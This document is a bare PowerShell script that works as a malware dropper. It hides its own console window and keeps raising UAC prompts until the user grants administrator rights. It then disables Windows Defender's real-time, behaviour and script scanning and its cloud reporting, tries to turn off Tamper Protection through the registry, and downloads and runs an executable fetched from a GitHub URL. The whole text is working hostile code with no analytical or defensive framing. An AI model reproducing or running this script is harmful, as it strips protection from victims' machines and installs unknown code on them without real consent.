# Hide Console Window
Add-Type -Name W -Namespace C -MemberDefinition '[DllImport("Kernel32.dll")] public static extern IntPtr GetConsoleWindow();[DllImport("User32.dll")] public static extern bool ShowWindow(IntPtr h,int c);' -ErrorAction SilentlyContinue
$w = [C.W]::GetConsoleWindow()
if ($w -ne [IntPtr]::Zero) { [C.W]::ShowWindow($w, 0) | Out-Null }

# ============ ADMIN CHECK ============
$isAdmin = ([Security.Principal.WindowsPrincipal] [Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)

if (-not $isAdmin) {
    # ============ ELEVATION LOOP (UAC until accepted) ============
    while ($true) {
        try {
            # Re-launch self with admin rights -> UAC prompt appears
            Start-Process powershell -Verb RunAs -WindowStyle Hidden -ArgumentList "-NoProfile -ExecutionPolicy Bypass -File `"$PSCommandPath`"" -ErrorAction Stop
            break
        } catch {
            # UAC was denied or cancelled -> loop and ask again
            Start-Sleep -Seconds 2
        }
    }
    exit
}

# ============ ADMIN GRANTED: KILL DEFENDER ============
# Real-Time Protection
Set-MpPreference -DisableRealtimeMonitoring $true
Set-MpPreference -DisableBehaviorMonitoring $true
Set-MpPreference -DisableIOAVProtection $true
Set-MpPreference -DisableScriptScanning $true
Set-MpPreference -MAPSReporting Disabled

# Tamper Protection via Registry
$tp = "HKLM:\SOFTWARE\Microsoft\Windows Defender\Features"
Set-ItemProperty -Path $tp -Name "TamperProtection" -Value 0 -Force

# ============ DOWNLOAD + RUN MSI ============
$url = "https://github.com/analysisw/test/raw/refs/heads/main/helloworldd.exe"
$out = Join-Path $env:TEMP "helloworldd.exe"
Invoke-WebRequest -Uri $url -OutFile $out
Start-Process $out
